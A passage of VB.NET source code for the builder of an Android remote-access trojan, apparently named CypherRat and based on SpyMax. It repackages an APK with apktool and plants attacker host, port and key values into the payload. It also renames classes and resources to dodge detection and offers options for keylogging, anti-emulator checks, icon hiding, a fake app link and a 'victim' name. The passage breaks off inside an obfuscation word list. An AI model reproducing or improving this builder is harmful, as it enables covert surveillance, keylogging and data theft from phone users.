                    '                                    .Replace(ClassGen12, NClassGen12) _
                    '                                    .Replace(ClassGen13, NClassGen13) _
                    '                                    .Replace(ClassGen14, NClassGen14) _
                    '                                    .Replace(_ask_battary_, N_ask_battary_) _
                    '                                    .Replace(_ask_draw_, N_ask_draw_) _
                    '                                    .Replace(_sc_fb_, N_sc_fb_) _
                    '                                    .Replace(_news_g_, N_news_g_) _
                    '                                    .Replace(_scctrl_, N_scctrl_) _
                    '                                    .Replace(_access_ask_, N_access_ask_) _
                    '                                    .Replace(_cap_sc_, N_cap_sc_) _
                    '                                    .Replace(_trns_g_, N_trns_g_) _
                    '                                    .Replace(_ask_prim_, N_ask_prim_) _
                    '                                    .Replace(_engine_wrk_, N_engine_wrk_) _
                    '                                    .Replace(_skin_cls_, N_skin_cls_) _
                    '                                    .Replace(_update_app_, N_update_app_) _
                    '                                    .Replace(_callr_lsnr_, N_callr_lsnr_) _
                    '                                    .Replace(_clss_loder_, N_clss_loder_) _
                    '                                    .Replace(_excut_meth_, N_excut_meth_) _
                    '                                    .Replace(_run_comnd_, N_run_comnd_) _
                    '                                    .Replace(_get_me_fil_, N_get_me_fil_) _
                    '                                    .Replace(_srv_worker_, N_srv_worker_) _
                    '                                    .Replace(resoString0, NresoString0) _
                    '                                    .Replace(resoString1, NresoString1) _
                    '                                    .Replace(resoString2, NresoString2) _
                    '                                    .Replace(resoString3, NresoString3) _
                    '                                    .Replace(resoString4, NresoString4) _
                    '                                    .Replace(resoString5, NresoString5) _
                    '                                    .Replace(resoString6, NresoString6) _
                    '                                    .Replace(resoString7, NresoString7) _
                    '                                    .Replace(resoString8, NresoString8) _
                    '                                    .Replace(resoString9, NresoString9) _
                    '                                    .Replace(resoString10, NresoString10) _
                    '                                    .Replace(resoString11, NresoString11) _
                    '                                    .Replace(resoString12, NresoString12) _
                    '                                    .Replace(app_reso0, Napp_reso0) _
                    '                                    .Replace("suffix", flavor) _
                    '                                    .Replace(draw_ico, Ndraw_ico) _
                    '                                    .Replace(draw_notifi, Ndraw_notifi) _
                    '                                    .Replace(webXML, NwebXML) _
                    '                                    .Replace(notifiXML, NnotifiXML) _
                    '                                    .Replace("key.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(KEY))) _
                    '                                    .Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                    '                                    .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))) _
                    '                                    .Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs") _
                    '                                    .Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv") _
                    '                                    .Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr") _
                    '                                    .Replace("[CYPHER_VICTIM]", namevictim) _
                    '                                    .Replace("[TYPE-HIDE]", THETYPE) _
                    '                                    .Replace("skin.info", FAKEAPPlink) _
                    '                                    .Replace("USE-SUPER", isuper) _
                    '                                    .Replace("_isequel_mth_", "helpscanintnum") _
                    '                                    .Replace("_exit_meth_", new_exit_mth) _
                    '                                    .Replace("_wifipolc_meth_", new_wifipolc) _
                    '                                    .Replace("_formtpakt_methd_", new_formatpacket) _
                    '                                    .Replace("_DZIP_meth_", new_dzip) _
                    '                                    .Replace("_Getbyte_meth_", new_getbyte) _
                    '                                    .Replace("_D_BASE64_", new_base_mth) _
                    '                                    .Replace("_getstr_meth_", new_getstr) _
                    '                                    .Replace("_CZIP_meth_", new_czip) _
                    '                                    .Replace("_inst_bnd_", new_inst) _
                    '                                    .Replace("_strt_con_", new_strt_con_) _
                    '                                    .Replace("[USE-REC]", UseRecorder) _
                    '                                    .Replace("_fist_inf_", new_fist_inf_) _
                    '                                    .Replace("_new_con_", new_new_con_) _
                    '                                    .Replace("trg.trgtapp.trg", TheTarget) _
                    '                                    .Replace("_send_it_", new_send_it_) _
                    '                                    .Replace("_Reblace_", new_Reblace_) _
                    '                                    .Replace("_runn_srv_", new_runn_srv_) _
                    '                                    .Replace("[off_keylog]", OFFKEYLOG) _
                    '                                    .Replace("[NO_EMUALTOR]", ANTIEMO) _
                    '                                    .Replace("_NOTIFI_TITLE_", NOTIFI_TITLE) _
                    '                                    .Replace("_NOTIFI_MSG_", NOTIFI_MSG) _
                    '                                    .Replace("_randomS_shit_", Randomunicode(100, 200)) _
                    '                                    .Replace("[RANDOM-STRING]", NEWRANDOM) _
                    '                                    .Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==")

                    '                                End If

                    '                                IO.File.WriteAllText(di.FullName, smali)

                    '                            Next

                    '                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali_classes2\" & spymax & "\" & stub7, pack2)

                    '                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali_classes2\" & spymax, pack1)

                    '                        Else

                    '                            Threading.Thread.Sleep(_Time)

                    '                            GoTo Back65

                    '                        End If


                    '                    Catch ex As Exception

                    '                        Threading.Thread.Sleep(_Time)

                    '                        GoTo Back65

                    '                    End Try


                    'Back66:
                    '                    Try




                    '                        Dim folder_smali As String = folder_apktool & "\" & tempApk & "\smali_classes3\" & spymax & "\" & stub7

                    '                        If IO.Directory.Exists(folder_smali) Then

                    '                            Dim FileDirectory As New IO.DirectoryInfo(folder_smali)

                    '                            Dim smi As IO.FileInfo() = FileDirectory.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv("*.smali")

                    '                            LOG("Encryption 3" + vbNewLine + "---------")
                    '                            For Each di In smi

                    '                                Dim smali As String = IO.File.ReadAllText(di.FullName)

                    '                                If di.Name.ToLower = ("buildconfig.smali") Then
                    '                                    smali = smali.Replace("payload", payload) _
                    '                                    .Replace("suffix", flavor) _
                    '                                    .Replace(spymax, pack1) _
                    '                                    .Replace(stub7, pack2) _
                    '                                    .Replace(resoString0, NresoString0) _
                    '                                    .Replace(resoString1, NresoString1) _
                    '                                    .Replace(resoString2, NresoString2) _
                    '                                    .Replace(resoString3, NresoString3) _
                    '                                    .Replace(resoString4, NresoString4) _
                    '                                    .Replace(resoString5, NresoString5) _
                    '                                    .Replace(resoString6, NresoString6) _
                    '                                    .Replace(resoString7, NresoString7) _
                    '                                    .Replace(resoString8, NresoString8) _
                    '                                    .Replace(resoString9, NresoString9) _
                    '                                    .Replace(resoString10, NresoString10) _
                    '                                    .Replace(resoString11, NresoString11) _
                    '                                    .Replace(resoString12, NresoString12) _
                    '                                    .Replace(app_reso0, Napp_reso0) _
                    '                                    .Replace(draw_ico, Ndraw_ico) _
                    '                                    .Replace(draw_notifi, Ndraw_notifi) _
                    '                                    .Replace(webXML, NwebXML) _
                    '                                    .Replace(notifiXML, NnotifiXML)

                    '                                Else


                    '                                    'If di.Name.ToLower = "classgen11.smali" Then
                    '                                    '    smali = smali.Replace("key.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(KEY))) _
                    '                                    '   .Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                    '                                    '   .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))) _
                    '                                    '   .Replace("[CYPHER_VICTIM]", namevictim)

                    '                                    'End If


                    '                                    'If di.Name = "AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg$2.smali" Then
                    '                                    '    smali = smali.Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                    '                                    '            .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports)))
                    '                                    'End If

                    '                                    smali = smali.Replace(spymax, pack1).Replace(stub7, pack2) _
                    '                                    .Replace(ClassGen0, NClassGen0) _
                    '                                    .Replace(ClassGen1, NClassGen1) _
                    '                                    .Replace(ClassGen2, NClassGen2) _
                    '                                    .Replace(ClassGen3, NClassGen3) _
                    '                                    .Replace(ClassGen4, NClassGen4) _
                    '                                    .Replace(ClassGen5, NClassGen5) _
                    '                                    .Replace(ClassGen6, NClassGen6) _
                    '                                    .Replace(ClassGen8, NClassGen8) _
                    '                                    .Replace(ClassGen9, NClassGen9) _
                    '                                    .Replace(ClassGen10, NClassGen10) _
                    '                                    .Replace(ClassGen11, NClassGen11) _
                    '                                    .Replace(ClassGen12, NClassGen12) _
                    '                                    .Replace(ClassGen13, NClassGen13) _
                    '                                    .Replace(ClassGen14, NClassGen14) _
                    '                                    .Replace(_ask_battary_, N_ask_battary_) _
                    '                                    .Replace(_ask_draw_, N_ask_draw_) _
                    '                                    .Replace(_sc_fb_, N_sc_fb_) _
                    '                                    .Replace(_news_g_, N_news_g_) _
                    '                                    .Replace(_scctrl_, N_scctrl_) _
                    '                                    .Replace(_access_ask_, N_access_ask_) _
                    '                                    .Replace(_cap_sc_, N_cap_sc_) _
                    '                                    .Replace(_trns_g_, N_trns_g_) _
                    '                                    .Replace(_ask_prim_, N_ask_prim_) _
                    '                                    .Replace(_engine_wrk_, N_engine_wrk_) _
                    '                                    .Replace(_skin_cls_, N_skin_cls_) _
                    '                                    .Replace(_update_app_, N_update_app_) _
                    '                                    .Replace(_callr_lsnr_, N_callr_lsnr_) _
                    '                                    .Replace(_clss_loder_, N_clss_loder_) _
                    '                                    .Replace(_excut_meth_, N_excut_meth_) _
                    '                                    .Replace(_run_comnd_, N_run_comnd_) _
                    '                                    .Replace(_get_me_fil_, N_get_me_fil_) _
                    '                                    .Replace(_srv_worker_, N_srv_worker_) _
                    '                                    .Replace(resoString0, NresoString0) _
                    '                                    .Replace(resoString1, NresoString1) _
                    '                                    .Replace(resoString2, NresoString2) _
                    '                                    .Replace(resoString3, NresoString3) _
                    '                                    .Replace(resoString4, NresoString4) _
                    '                                    .Replace(resoString5, NresoString5) _
                    '                                    .Replace(resoString6, NresoString6) _
                    '                                    .Replace(resoString7, NresoString7) _
                    '                                    .Replace(resoString8, NresoString8) _
                    '                                    .Replace(resoString9, NresoString9) _
                    '                                    .Replace(resoString10, NresoString10) _
                    '                                    .Replace(resoString11, NresoString11) _
                    '                                    .Replace(resoString12, NresoString12) _
                    '                                    .Replace(app_reso0, Napp_reso0) _
                    '                                    .Replace("suffix", flavor) _
                    '                                    .Replace(draw_ico, Ndraw_ico) _
                    '                                    .Replace(draw_notifi, Ndraw_notifi) _
                    '                                    .Replace(webXML, NwebXML) _
                    '                                    .Replace(notifiXML, NnotifiXML) _
                    '                                    .Replace("key.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(KEY))) _
                    '                                    .Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                    '                                    .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))) _
                    '                                    .Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs") _
                    '                                    .Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv") _
                    '                                    .Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr") _
                    '                                    .Replace("[CYPHER_VICTIM]", namevictim) _
                    '                                    .Replace("[TYPE-HIDE]", THETYPE) _
                    '                                    .Replace("skin.info", FAKEAPPlink) _
                    '                                    .Replace("USE-SUPER", isuper) _
                    '                                    .Replace("_isequel_mth_", "helpscanintnum") _
                    '                                    .Replace("_exit_meth_", new_exit_mth) _
                    '                                    .Replace("_wifipolc_meth_", new_wifipolc) _
                    '                                    .Replace("_formtpakt_methd_", new_formatpacket) _
                    '                                    .Replace("_DZIP_meth_", new_dzip) _
                    '                                    .Replace("_Getbyte_meth_", new_getbyte) _
                    '                                    .Replace("_D_BASE64_", new_base_mth) _
                    '                                    .Replace("_getstr_meth_", new_getstr) _
                    '                                    .Replace("_CZIP_meth_", new_czip) _
                    '                                    .Replace("_inst_bnd_", new_inst) _
                    '                                    .Replace("_strt_con_", new_strt_con_) _
                    '                                    .Replace("[USE-REC]", UseRecorder) _
                    '                                    .Replace("_fist_inf_", new_fist_inf_) _
                    '                                    .Replace("_new_con_", new_new_con_) _
                    '                                    .Replace("trg.trgtapp.trg", TheTarget) _
                    '                                    .Replace("_send_it_", new_send_it_) _
                    '                                    .Replace("_Reblace_", new_Reblace_) _
                    '                                    .Replace("_runn_srv_", new_runn_srv_) _
                    '                                    .Replace("[off_keylog]", OFFKEYLOG) _
                    '                                    .Replace("[NO_EMUALTOR]", ANTIEMO) _
                    '                                    .Replace("_NOTIFI_TITLE_", NOTIFI_TITLE) _
                    '                                    .Replace("_NOTIFI_MSG_", NOTIFI_MSG) _
                    '                                    .Replace("_randomS_shit_", Randomunicode(100, 200)) _
                    '                                    .Replace("[RANDOM-STRING]", NEWRANDOM) _
                    '                                    .Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==")

                    '                                End If

                    '                                IO.File.WriteAllText(di.FullName, smali)

                    '                            Next

                    '                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali_classes3\" & spymax & "\" & stub7, pack2)

                    '                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali_classes3\" & spymax, pack1)

                    '                        Else

                    '                            Threading.Thread.Sleep(_Time)

                    '                            GoTo Back66

                    '                        End If


                    '                    Catch ex As Exception

                    '                        Threading.Thread.Sleep(_Time)

                    '                        GoTo Back66

                    '                    End Try

Back7:
                    Try

                        If IO.File.Exists(public_xml) Then
                            Dim pub_xml As String = IO.File.ReadAllText(public_xml) _
                            .Replace(resoString0, NresoString0) _
                            .Replace(resoString1, NresoString1) _
                            .Replace(resoString2, NresoString2) _
                            .Replace(resoString3, NresoString3) _
                            .Replace(resoString4, NresoString4) _
                            .Replace(resoString5, NresoString5) _
                            .Replace(resoString6, NresoString6) _
                            .Replace(resoString7, NresoString7) _
                            .Replace(resoString8, NresoString8) _
                            .Replace(resoString9, NresoString9) _
                            .Replace(resoString10, NresoString10) _
                            .Replace(resoString11, NresoString11) _
                            .Replace(resoString12, NresoString12) _
                            .Replace(app_reso0, Napp_reso0) _
                            .Replace(draw_ico, Ndraw_ico) _
                            .Replace(draw_notifi, Ndraw_notifi) _
                            .Replace(webXML, NwebXML) _
                            .Replace(notifiXML, NnotifiXML)
                            IO.File.WriteAllText(public_xml, pub_xml)

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back7

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back7

                    End Try


Back8:
                    Try

                        If IO.File.Exists(web_xml) Then

                            My.Computer.FileSystem.RenameFile(web_xml, NwebXML & ".xml")

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back8

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back8

                    End Try



Back9:
                    Try

                        If IO.File.Exists(notifi_xml) Then

                            My.Computer.FileSystem.RenameFile(notifi_xml, NnotifiXML & ".xml")

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back9

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back9

                    End Try


                    vulTrack = 80


                    Try

                        Dim FlavorTargetfolder As String = folder_apktool & "\" & tempApk & "\smali\" & spymax & "\" & stub7 & "\" & flavor
                        If Not Directory.Exists(FlavorTargetfolder) Then
                            Directory.CreateDirectory(FlavorTargetfolder)
                        End If

                        For Each fi As FileInfo In New DirectoryInfo(folder_apktool & "\" & tempApk & "\smali\" & spymax & "\" & stub7).GetFiles
                            File.Move(fi.FullName, FlavorTargetfolder + "\" + fi.Name)
                        Next
                    Catch ex As Exception

                    End Try

                    Try
                        Dim FlavorTargetfolder As String = folder_apktool & "\" & tempApk & "\smali_classes2\" & spymax & "\" & stub7 & "\" & flavor
                        If Not Directory.Exists(FlavorTargetfolder) Then
                            Directory.CreateDirectory(FlavorTargetfolder)
                        End If

                        For Each fi As FileInfo In New DirectoryInfo(folder_apktool & "\" & tempApk & "\smali_classes2\" & spymax & "\" & stub7).GetFiles
                            File.Move(fi.FullName, FlavorTargetfolder + "\" + fi.Name)
                        Next
                    Catch ex As Exception

                    End Try

                    Try
                        Dim FlavorTargetfolder As String = folder_apktool & "\" & tempApk & "\smali_classes3\" & spymax & "\" & stub7 & "\" & flavor
                        If Not Directory.Exists(FlavorTargetfolder) Then
                            Directory.CreateDirectory(FlavorTargetfolder)
                        End If

                        For Each fi As FileInfo In New DirectoryInfo(folder_apktool & "\" & tempApk & "\smali_classes3\" & spymax & "\" & stub7).GetFiles
                            File.Move(fi.FullName, FlavorTargetfolder + "\" + fi.Name)
                        Next
                    Catch ex As Exception

                    End Try

                    ' LOG("Building..." + vbNewLine + "..........")

                    CMD.StandardInput.WriteLine("apktool b " & tempApk) ' اعادة تغليف

                    Exit While

                Catch ex As Exception

                    Threading.Thread.Sleep(_Time)

                    GoTo Back0

                End Try


            Else

                Threading.Thread.Sleep(_Time)

                GoTo Back0

            End If


            Threading.Thread.Sleep(_Time)

        End While

    End Sub


    Private Sub LOG(Str As String)
        If Me.InvokeRequired Then
            Dim args() As String = {Str}
            Me.Invoke(New Action(Of String)(AddressOf LOG), args)
            Return
        End If
        TextBox1.AppendText(vbNewLine + "-> " + Str)
    End Sub

    Private Sub LOGEND(Str As String)
        If Me.InvokeRequired Then
            Dim args() As String = {Str}
            Me.Invoke(New Action(Of String)(AddressOf LOGEND), args)
            Return
        End If
        TextBox1.AppendText(Str)
    End Sub

    Private Sub Close_cmd()

        Try
            Application.ExitThread()

            CMD.CancelOutputRead()

            CMD.CancelErrorRead()

            CMD.Kill()

            CMD.Close()
        Catch ex As Exception

        End Try



    End Sub
    Private Sub ex()
        ' MsgBox("cmd.exe Unexpectedly closed !!", MsgBoxStyle.Critical, "CypherRat")
        Try
            Close_cmd()
        Catch ex As Exception
        Finally
            ' End
        End Try
    End Sub

    Private Const tempApk As String = "temp"

    Public Property ZipFile As Object

    Private CMD As Object

    Private Sub File_zip_Decompress(zipPath As String, pathfolder As String)

        If Not System.IO.Directory.Exists(pathfolder) Then

            System.IO.Directory.CreateDirectory(pathfolder)

        End If

        System.IO.Compression.ZipFile.ExtractToDirectory(zipPath, pathfolder)

    End Sub

    Public Function GetDriv() As String

        Try

            Dim f() As String = {"\"}

            Dim a() As String = Application.StartupPath.Split(f, StringSplitOptions.RemoveEmptyEntries)

            Return a(0).ToString & "\"

        Catch

            Return "C:\"

        End Try

    End Function
    Private Sub KillA()
        Try
            Process.GetProcessesByName("java")(0).Kill()
        Catch xd0 As Exception
        End Try
        Try
            Process.GetProcessesByName("cmd")(0).Kill()
        Catch xd1 As Exception
        End Try
    End Sub
    Private Sub saveAll()

        My.Settings.build_text_name_victim = TextNameVictim.Text

        My.Settings.build_text_name_patch = TextNamePatch.Text

        My.Settings.build_text_version = TextVersion.Text

        My.Settings.build_text_sleep = "0"

        My.Settings.build_text_port = po.Text

        My.Settings.build_Checked_hide = CheckHide.Checked

        My.Settings.build_Checked_doze = CheckDoze.Checked

        My.Settings.build_Checked_icon = CheckIconPatch.Checked

        My.Settings.build_path_icon = iconPatch

        My.Settings.BIND_Path = BIND_Path

        My.Settings.BIND_EX = BIND_EX

        My.Settings.intent = intent_

        Dim DNS As String = ""

        If DGV0.Rows.Count > 0 Then

            For i As Integer = 0 To DGV0.Rows.Count - 1

                DNS &= DGV0.Rows(i).Cells(0).Value & SplitterDNS

            Next

        Else

            DNS = "null"

        End If

        My.Settings.build_DGV_list = DNS

        My.Settings.Save()

    End Sub



    Private Sub Build_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing

        If Not TiMAT.Enabled = False Then TiMAT.Enabled = False

        Me.DialogResult = DialogResult.Cancel

    End Sub

    Private Sub TextPackage_TextChanged(sender As Object, e As EventArgs)

        Dim scan As String = TextPackage.Text.Trim

        If Package_keyback Then

            If Not scan.Contains(".") Then

                Dim cn As Integer = TextPackage.SelectionStart

                scan = scan.Insert(cn, ".")

                TextPackage.Text = scan

                Try
                    TextPackage.SelectionStart = scan.IndexOf(".")
                Catch x_skipErrors As Exception
                End Try

            End If

        End If


        Try
            If IsNumeric(scan.Chars(0).ToString) Then
                TextPackage.Text = scan.Substring(1, scan.Length - 1)
            End If
        Catch x_skipErrors As Exception

        End Try

        Try

            If IsNumeric(scan.Chars(scan.IndexOf(".") + 1).ToString) Then
                TextPackage.Text = TextPackage.Text.Replace("." & scan.Chars(scan.IndexOf(".") + 1).ToString, ".")
                TextPackage.SelectionStart = scan.IndexOf(".")
            End If
        Catch x_skipErrors As Exception

        End Try

    End Sub

    Private Sub TextPackage_KeyDown(sender As Object, e As KeyEventArgs)

        If e.KeyCode = Keys.Back Then

            Package_keyback = True

        Else

            Package_keyback = False

        End If

    End Sub

    Private Sub TextPackage_KeyPress(sender As Object, e As KeyPressEventArgs)

        If Not TextPackage.SelectionLength = 0 Then

            If TextPackage.SelectedText.Contains(".") Then

                TextPackage.DeselectAll()

                e.Handled = True

                Return

            End If

        End If

        Dim scan As String = TextPackage.Text.Trim

        Dim sKeys As String = "qazwsxedcrfvtgbyhnujmikolp"

        Dim sKeysAll As String = "1234567890qazwsxedcrfvtgbyhnujmikolp"

        If scan.EndsWith(".") Then
            If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not Package_keyback Then

                e.Handled = True

                Return

            End If
        Else
            If Not sKeysAll.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not Package_keyback Then

                e.Handled = True

            End If
        End If

    End Sub




    Private Sub TextFlavor_KeyPress(sender As Object, e As KeyPressEventArgs)

        Dim sKeys As String = "1234567890qazwsxedcrfvtgbyhnujmikolp"

        If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) AndAlso Not keyback Then

            e.Handled = True

        End If

    End Sub
    Private Sub TextVersion_KeyPress(sender As Object, e As KeyPressEventArgs)

        If keybackVersion Then

            e.Handled = False

            Return

        End If

        Dim sKeys As String = "1234567890qazwsxedcrfvtgbyhnujmikolp."

        If Not sKeys.Contains(e.KeyChar.ToString().ToLower()) Then

            e.Handled = True

        End If

    End Sub
    Private Sub TextVersion_KeyDown(sender As Object, e As KeyEventArgs)

        If e.KeyCode = Keys.Back Then

            keybackVersion = True

        Else

            keybackVersion = False

        End If

    End Sub
    Private Sub TextFlavor_KeyDown(sender As Object, e As KeyEventArgs)

        If e.KeyCode = Keys.Back Then

            keyback = True

        Else

            keyback = False

        End If

    End Sub

    Private Sub sleep_TextChanged(sender As Object, e As EventArgs)

        Dim ts As TimeSpan = TimeSpan.FromMilliseconds(0)

        Dim sTime As String = String.Empty

        If Not ts.Days = 0 Then

            sTime &= "Days " & CStr(ts.Days) & vbNewLine

        End If

        If Not ts.Hours = 0 Then

            sTime &= "Hours:" & CStr(ts.Hours) & vbNewLine

        End If

        If Not ts.Minutes = 0 Then

            sTime &= "Minutes:" & CStr(ts.Minutes) & vbNewLine

        End If

        If Not ts.Seconds = 0 Then

            sTime &= "Seconds:" & CStr(ts.Seconds) & vbNewLine

        End If

        If Not ts.Milliseconds = 0 Then

            sTime &= "Millis " & CStr(ts.Milliseconds) & vbNewLine

        End If


        'sleep.Tag = If(sTime = String.Empty, "No Delay", sTime)

    End Sub



    Private Sub b_del_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub btnUp_Click(sender As Object, e As EventArgs)

        Rowinsert(False)

    End Sub

    Private Sub btnDown_Click(sender As Object, e As EventArgs)

        Rowinsert(True)

    End Sub
    Private Sub Rowinsert(ByVal isDown As Boolean)

        If DGV0.SelectedRows.Count = 1 And Not DGV0.Rows.Count = 1 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim vul As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Value

                If isDown Then

                    DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index)

                    DGV0.Rows.Insert(DGV0.SelectedRows(i).Index + 1, vul)

                    DGV0.CurrentCell = DGV0.Rows(DGV0.SelectedRows(i).Index + 1).Cells(0)

                Else

                    If Not DGV0.SelectedRows(i).Index = 0 Then

                        DGV0.Rows.Insert(DGV0.SelectedRows(i).Index - 1, vul)

                        DGV0.CurrentCell = DGV0.Rows(DGV0.SelectedRows(i).Index - 1).Cells(0)

                        DGV0.Rows.RemoveAt(DGV0.SelectedRows(i).Index + 1)

                        DGV0.CurrentCell = DGV0.Rows(DGV0.SelectedRows(i).Index - 1).Cells(0)

                    End If

                End If

            Next

        End If

    End Sub

    Private Sub Build_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If IO.File.Exists(folder_apktool & "\" & tempApk & ".apk") Then
            IO.File.Delete(folder_apktool & "\" & tempApk & ".apk")
        End If
        KillA()
    End Sub







    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText0.Count > 0 Then
            For Each rec In RectInputText0
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If

        Dim clr As Color = Color.FromArgb(150, SpySettings.DefaultColor_Foreground.R,
SpySettings.DefaultColor_Foreground.G, SpySettings.DefaultColor_Foreground.B)
        Dim clrPen As New Pen(clr, 1)
        Dim rect As New Rectangle(0, 0, Panel1.Width - 1, Panel1.Height - 1)
        e.Graphics.DrawRectangle(clrPen, rect)

        'ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, SpySettings.DefaultColor_Foreground, ButtonBorderStyle.Dashed)
    End Sub

    Private Sub Combotype_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combotype.SelectedIndexChanged
        If combotype.Text = "Custom" Then
            fakepanel.Enabled = True
        Else
            fakepanel.Enabled = False
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

    End Sub


    Private randmid As String() = New String() {"a", "aa", "aaa", "aaron", "ab", "abandoned", "abc", "aberdeen", "abilities", "ability", "able", "aboriginal", "abortion", "about", "above", "abraham", "abroad", "abs", "absence", "absent", "absolute", "absolutely", "absorption", "abstract", "abstracts", "abu", "abuse", "ac", "academic", "academics", "academy", "acc", "accent", "accept", "acceptable", "acceptance", "accepted", "accepting", "accepts", "access", "accessed", "accessibility", "accessible", "accessing", "accessories", "accessory", "accident", "accidents", "accommodate", "accommodation", "accommodations", "accompanied", "accompanying", "accomplish", "accomplished", "accordance", "according", "accordingly", "account", "accountability", "accounting", "accounts", "accreditation", "accredited", "accuracy", "accurate", "accurately", "accused", "acdbentity", "ace", "acer", "achieve", "achieved", "achievement", "achievements", "achieving", "acid", "acids", "acknowledge", "acknowledged", "acm", "acne", "acoustic", "acquire", "acquired", "acquisition", "acquisitions", "acre", "acres", "acrobat", "across", "acrylic", "act", "acting", "action", "actions", "activated", "activation", "active", "actively", "activists", "activities", "activity", "actor", "actors", "actress", "acts", "actual", "actually", "acute", "ad", "ada", "adam", "adams", "adaptation", "adapted", "adapter", "adapters", "adaptive", "adaptor", "add", "added", "addiction", "adding", "addition", "additional", "additionally", "additions", "address", "addressed", "addresses", "addressing", "adds", "adelaide", "adequate", "adidas", "adipex", "adjacent", "adjust", "adjustable", "adjusted", "adjustment", "adjustments", "admin", "administered", "administration", "administrative", "administrator", "administrators", "admission", "admissions", "admit", "admitted", "adobe", "adolescent", "adopt", "adopted", "adoption", "adrian", "ads", "adsl", "adult", "adults", "advance", "advanced", "advancement", "advances", "advantage", "advantages", "adventure", "adventures", "adverse", "advert", "advertise", "advertisement", "advertisements", "advertiser", "advertisers", "advertising", "advice", "advise", "advised", "advisor", "advisors", "advisory", "advocacy", "advocate", "adware", "ae", "aerial", "aerospace", "af", "affair", "affairs", "affect", "affected", "affecting", "affects", "affiliate", "affiliated", "affiliates", "affiliation", "afford", "affordable", "afghanistan", "afraid", "africa", "african", "after", "afternoon", "afterwards", "ag", "again", "against", "age", "aged", "agencies", "agency", "agenda", "agent", "agents", "ages", "aggregate", "aggressive", "aging", "ago", "agree", "agreed", "agreement", "agreements", "agrees", "agricultural", "agriculture", "ah", "ahead", "ai", "aid", "aids", "aim", "aimed", "aims", "air", "aircraft", "airfare", "airline", "airlines", "airplane", "airport", "airports", "aj", "ak", "aka", "al", "ala", "alabama", "alan", "alarm", "alaska", "albania", "albany", "albert", "alberta", "album", "albums", "albuquerque", "alcohol", "alert", "alerts", "alex", "alexander", "alexandria", "alfred", "algebra", "algeria", "algorithm", "algorithms", "ali", "alias", "alice", "alien", "align", "alignment", "alike", "alive", "all", "allah", "allan", "alleged", "allen", "allergy", "alliance", "allied", "allocated", "allocation", "allow", "allowance", "allowed", "allowing", "allows", "alloy", "almost", "alone", "along", "alot", "alpha", "alphabetical", "alpine", "already", "also", "alt", "alter", "altered", "alternate", "alternative", "alternatively", "alternatives", "although", "alto", "aluminium", "aluminum", "alumni", "always", "am", "amanda", "amateur", "amazing", "amazon", "amazoncom", "amazoncouk", "ambassador", "amber", "ambien", "ambient", "amd", "amend", "amended", "amendment", "amendments", "amenities", "america", "american", "americans", "americas", "amino", "among", "amongst", "amount", "amounts", "amp", "ampland", "amplifier", "amsterdam", "amy", "an", "ana", "anaheim", "anal", "analog", "analyses", "analysis", "analyst", "analysts", "analytical", "analyze", "analyzed", "anatomy", "anchor", "ancient", "and", "andale", "anderson", "andorra", "andrea", "andreas", "andrew", "andrews", "andy", "angel", "angela", "angeles", "angels", "anger", "angle", "angola", "angry", "animal", "animals", "animated", "animation", "anime", "ann", "anna", "anne", "annex", "annie", "anniversary", "annotated", "annotation", "announce", "announced", "announcement", "announcements", "announces", "annoying", "annual", "annually", "anonymous", "another", "answer", "answered", 